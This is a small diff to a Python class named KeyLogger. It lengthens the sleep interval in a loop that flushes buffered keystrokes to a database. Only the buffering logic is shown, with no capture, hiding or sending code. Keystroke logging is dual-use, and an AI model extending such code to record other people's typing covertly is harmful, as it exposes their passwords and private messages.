@@ -58,7 +58,7 @@ class KeyLogger:
 
     def write_to_db(self):
         while self.running:
-            time.sleep(0.5)  # Wait longer between checks
+            time.sleep(15)  # Wait longer between checks
             current_time = time.time()
             with self.buffer_lock:
                 if self.key_buffer and (current_time - self.last_write >= 2.0 or len(self.key_buffer) > 100):  # Increased buffer time and size
